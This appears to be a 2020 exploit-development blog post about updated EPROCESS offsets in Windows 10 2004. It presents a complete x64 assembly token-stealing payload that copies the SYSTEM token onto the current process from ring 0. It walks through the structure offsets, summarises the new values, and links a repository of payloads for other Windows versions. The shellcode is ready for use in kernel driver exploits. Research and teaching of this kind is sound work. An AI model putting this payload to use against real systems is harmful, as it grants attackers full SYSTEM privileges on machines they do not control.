---
layout: post
title: 'Windows 10 2004 (20H1) Token Stealing Payload and EPROCESS Changes'
date: '2020-06-21T00:00:00.000-00:00'
author: Keramas
tags: [kernel,exploit development]
---

I recently re-did my Windows kernel debugging environment with the latest version of Windows 10, 2004 (20H1), and while writing a proof of concept for a driver exploit, I noticed that the token stealing payload I was using was breaking due to a bad dereference when it was crawling the EPROCESS structure. This meant that the offsets had once again changed in this new Windows build. 

## Token Stealing Payload 

The following is the updated token stealing payload that works on Windows 10 2004.

```asm
; Windows 10 x64 2004 Token Stealing Payload

[BITS 64]

__start:
	xor rax, rax
	mov rax, [gs:0x188]	; Current thread -> _KTHREAD
	mov rax, [rax + 0xb8]	; Current process -> _EPROCESS
	mov r8, rax		; Move current process' _EPROCESS to r8

__loop:
	mov rax, [rax + 0x448]	; ActiveProcessLinks
	sub rax, 0x448		; Return to current process -> _EPROCESS
	mov rcx, [rax + 0x440]	; UniqueProcessId (PID)
	cmp rcx, 4		; Compare PID to SYSTEM process PID (0x4)
	jnz __loop		; Iterate over EPROCESS nodes until SYSTEM PID is located

	mov r9, [rax + 0x4b8]	; _EPROCESS + 0x4b8 -> token
	mov [r8 + 0x4b8], r9	; Copy SYSTEM token to current process
```

For those who are unfamiliar with how the above payload works to grant system-level privilges, lets walk through the assembly a bit while explaining about the EPROCESS structure.

As the name implies, this payload aims to escalate privileges when it runs in ring 0 by grabbing a system-level token from the System process (PID of 4), and then replacing the current process' token with it. To accomplish this, it crawls several structures in order to reach the token in the System process.

First, Windows stores the location of the KTHREAD structure in the `gs` register at offset `0x188` (`[gs:0x188]`), and at offset 0xb8 of that structure, there is a pointer to the EPROCESS structure of the current process. 

The EPROCESS structure contains various process-related attributes and pointers to other structures. For the token stealing payload, several offsets will need to be gathered:

- Offset to ActiveProcessLinks
- Offset to the UniqueProcessId (the PID of the process)
- Offset to token associated with the process

From WinDBG, the EPROCESS structure can be explored the with the following command:
```
dt nt!_EPROCESS <address of process>
```

<img src = "/assets/images/EPROCESS.png">

The address used in the image is the address of the System process. The `UniqueProcessId` is located at offset `0x440`, and as the value shows, it is `0x4`, which is always the PID of the System process. Additionally, `ActiveProcessLinks` can be found at offset `0x448`. This points to the `LIST_ENTRY` structure which is a doubly-linked list containing EPROCESS nodes. This list is then iterated over and the PID is checked to see whether the value is 0x4 or not. Once it is found, the token of that process will be taken, as the System process is running under the context of nt authority\system. 

<img src = "/assets/images/EPROCESS_TOKEN.png">

The token can be found at offset `0x4b8` in the EPROCESS structure. The value present here will then replace the token of the current process in the final instruction of the payload allowing for the escalation of privileges. 

## Token Stealing Payload Stub 

To help facilitate kernel exploits being used on multiple versions of Windows 10 x64, I organized some code to dynamically grab payloads for version 1507 - 2004 based on the Windows version detected. 

- https://github.com/Keramas/WindowsKernelExploits/tree/master/shellcode


## In Summary / TL;DR

- New offsets within EPROCESS structure for Windows 10 2004
- As it relates to ring 0 token stealing payloads:
  - UniqueProcessId is now at 0x440
  - ActiveProcessLinks is now at 0x448
  - Token is now at 0x4b8
- Update payloads accordingly when running on the latest version of Windows 10